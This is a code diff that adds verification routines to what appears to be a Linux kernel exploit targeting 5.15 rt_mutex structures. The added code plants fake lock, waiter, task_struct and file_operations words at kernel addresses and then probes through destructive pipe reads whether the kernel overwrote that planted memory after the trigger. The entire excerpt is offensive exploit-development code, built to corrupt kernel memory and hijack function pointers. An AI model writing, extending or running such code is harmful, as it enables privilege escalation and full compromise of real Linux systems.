@@ -375,6 +375,199 @@ int select_slide_payload_index(size_t index) {
   return 1;
 }
 
+#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
+    APP_FOPS_DEFER_ALIAS_READBACK
+/* skb mirror read: expected planted word at a bank kernel VA. The userspace
+ * skb_buf copy is never written by the kernel, so it is the ground truth
+ * for what WE planted (vs what the kernel may have touched). */
+int slide_bank_mirror_word(uintptr_t va, uint64_t *out) {
+  uintptr_t off;
+
+  if (!slide_bank_payload_base || !skb_buf || !out) {
+    return 0;
+  }
+  if (va < slide_bank_payload_base) {
+    return 0;
+  }
+  off = va - slide_bank_payload_base;
+  if (off + sizeof(uint64_t) > (uintptr_t)SKB_SEND_SIZE) {
+    return 0;
+  }
+  memcpy(out, skb_buf + off, sizeof(*out));
+  return 1;
+}
+
+/* Post-trigger production-touch probe, read-only. Builds the fops pair
+ * plus legacy production geometry words (lock@LOCK_OFF, waiter@W0_OFF,
+ * task@FAKE_TASK_OFF, fops-table anchors; expected = skb mirror) and runs
+ * ONE combined pipe loop (pipes are destructive-read). Returns the
+ * fops-pair verdict under the verify_p0_pipe_data_page contract.
+ * prod_touched_out: 1 = kernel touched production geometry (a nonzero word
+ * differs on a page proven mapped by a sibling nonzero match), 0 = all
+ * probed nonzero words match, -1 = inconclusive (production page not found
+ * in any pipe, or the stash is not production slot 0). Zero-planted words
+ * are probed but excluded from the verdict (indistinguishable on zero
+ * pages); interpret them via the per-pipe log lines only.
+ *
+ * NOTE: CLOSED production plants the legacy direct geometry, NOT bank
+ * slot 0 (bank entries are only written when the alias verifier is
+ * active). VAs therefore come from the trigger-time stash, never from
+ * select_slide_payload_index (which would give the unplanted bank slot). */
+int probe_fops_and_production_touch(
+    uintptr_t fops_target, uint64_t fops_expected, int *prod_touched_out) {
+  /* Production word list: (base selector, offset, label). Bases: 0 = lock
+   * (stash_lock), 1 = waiter (stash_lock-LOCK_OFF+W0_OFF),
+   * 2 = task (stash_lock-LOCK_OFF+FAKE_TASK_OFF).
+   * Lock offsets are the 5.15 struct rt_mutex layout (wait_lock 0x00,
+   * waiters 0x08, owner 0x18); waiter/task offsets use FAKE_* macros. */
+  static const struct {
+    int base;
+    size_t off;
+    const char *label;
+  } prod_words[] = {
+    { 0, 0x00, "prod.lock.wait_lock" },
+    { 0, 0x08, "prod.lock.waiters.lo" },
+    { 0, 0x10, "prod.lock.waiters.hi" },
+    { 0, 0x18, "prod.lock.owner" },
+    { 1, 0x00, "prod.waiter.tree_parent" },
+    { 1, 0x08, "prod.waiter.tree_right" },
+    { 1, 0x10, "prod.waiter.tree_left" },
+    { 1, FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, "prod.waiter.pi_parent" },
+    { 1, FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, "prod.waiter.pi_right" },
+    { 1, FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, "prod.waiter.pi_left" },
+    { 1, FAKE_WAITER_TASK_OFF, "prod.waiter.task" },
+    { 1, FAKE_WAITER_LOCK_OFF, "prod.waiter.lock" },
+    { 1, FAKE_WAITER_PRIO_OFF, "prod.waiter.prio" },
+    { 1, FAKE_WAITER_DEADLINE_OFF, "prod.waiter.deadline" },
+    { 2, FAKE_TASK_USAGE_OFF, "prod.task.usage" },
+    { 2, FAKE_TASK_PRIO_OFF, "prod.task.prio" },
+    { 2, FAKE_TASK_NORMAL_PRIO_OFF, "prod.task.normal_prio" },
+    { 2, FAKE_TASK_PI_WAITERS_OFF, "prod.task.pi_waiters" },
+    { 2, FAKE_TASK_PI_WAITERS_OFF + 0x08, "prod.task.pi_waiters+8" },
+    { 2, FAKE_TASK_PI_TOP_TASK_OFF, "prod.task.pi_top" },
+    { 2, FAKE_TASK_PI_BLOCKED_ON_OFF, "prod.task.blocked_on" },
+    { 3, FOPS_LLSEEK_OFF, "prod.fops.llseek" },
+    { 3, FOPS_READ_ITER_OFF, "prod.fops.read_iter" },
+    { 3, FOPS_IOCTL_OFF, "prod.fops.ioctl" },
+  };
+  struct p0_probe_pair pairs[1 + sizeof(prod_words) / sizeof(prod_words[0])];
+  uintptr_t bases[4];
+  size_t n = 1;
+  size_t i;
+  int verdict;
+  int touched = -1;
+
+  pairs[0].target = fops_target;
+  pairs[0].expected = fops_expected;
+  pairs[0].label = "fops";
+  pairs[0].exact = 0;
+  pairs[0].observed = 0;
+  pairs[0].nearest = -1;
+  if (prod_touched_out) {
+    *prod_touched_out = -1;
+  }
+  {
+    const char *skip = getenv("PROD_TOUCH_PROBE");
+    if (skip && *skip == '0') {
+      return verify_p0_probe_pairs(pairs, 1);
+    }
+  }
+  /* Production VAs from the trigger-time stash. Trusted only when the
+   * stash is production slot 0 AND the stashed lock equals the current
+   * FOPS plant's legacy lock (slot 0 can also be a bank VA when the alias
+   * verifier is active; silently probing bank zeros would mislead). */
+  if (fired_route_slot != 0 || !fired_route_lock ||
+      fired_route_lock != slide_bank_payload_base + (uintptr_t)LOCK_OFF) {
+    pr_info("prod touch skipped stash_slot=%zu stash_lock=%016zx base=%016zx\n",
+            fired_route_slot, fired_route_lock, slide_bank_payload_base);
+    return verify_p0_probe_pairs(pairs, 1);
+  }
+  bases[0] = fired_route_lock;
+  bases[1] = fired_route_lock - (uintptr_t)LOCK_OFF + (uintptr_t)W0_OFF;
+  bases[2] = fired_route_lock - (uintptr_t)LOCK_OFF + (uintptr_t)FAKE_TASK_OFF;
+  bases[3] = fired_route_lock - (uintptr_t)LOCK_OFF + (uintptr_t)FOPS_OFF;
+  for (i = 0; i < sizeof(prod_words) / sizeof(prod_words[0]); i++) {
+    uintptr_t va = bases[prod_words[i].base] + prod_words[i].off;
+    uint64_t planted = 0;
+    if (!slide_bank_mirror_word(va, &planted)) {
+      continue;
+    }
+    pairs[n].target = va;
+    pairs[n].expected = planted;
+    pairs[n].label = prod_words[i].label;
+    pairs[n].exact = 0;
+    pairs[n].observed = 0;
+    pairs[n].nearest = -1;
+    n++;
+  }
+  verdict = verify_p0_probe_pairs(pairs, n);
+  /* Verdict per 4K page group: a page is PROVEN mapped iff a nonzero
+   * expected word on it matched; TOUCHED iff a nonzero word on a proven
+   * page did not match anywhere. Zero-expected words never vote. */
+  {
+    uintptr_t pages[8];
+    size_t npages = 0;
+    for (i = 1; i < n; i++) {
+      uintptr_t pg = pairs[i].target & ~(uintptr_t)0xFFFULL;
+      size_t pi;
+      int proven = 0;
+      int missing = 0;
+      size_t j;
+      for (pi = 0; pi < npages; pi++) {
+        if (pages[pi] == pg) {
+          break;
+        }
+      }
+      if (pi < npages) {
+        continue;
+      }
+      if (npages < sizeof(pages) / sizeof(pages[0])) {
+        pages[npages++] = pg;
+      }
+      for (j = 1; j < n; j++) {
+        if ((pairs[j].target & ~(uintptr_t)0xFFFULL) != pg) {
+          continue;
+        }
+        if (!pairs[j].expected) {
+          continue;
+        }
+        if (pairs[j].exact > 0) {
+          proven = 1;
+        } else {
+          missing = 1;
+        }
+      }
+      if (proven && missing) {
+        touched = 1;
+        break;
+      }
+      if (proven && touched < 0) {
+        touched = 0;
+      }
+    }
+  }
+  {
+    size_t matched = 0;
+    size_t nonzero = 0;
+    for (i = 1; i < n; i++) {
+      if (!pairs[i].expected) {
+        continue;
+      }
+      nonzero++;
+      if (pairs[i].exact > 0) {
+        matched++;
+      }
+    }
+    pr_info("prod touch summary touched=%d words=%zu/%zu fops_verdict=%d\n",
+            touched, matched, nonzero, verdict);
+  }
+  if (prod_touched_out) {
+    *prod_touched_out = touched;
+  }
+  return verdict;
+}
+#endif
+
 #if (!defined(APP_CLOSED_FOPS_ROUTE) || !APP_CLOSED_FOPS_ROUTE) || \
     (defined(APP_REQUIRE_FRESH_P0_SESSION) && \
      APP_REQUIRE_FRESH_P0_SESSION && \
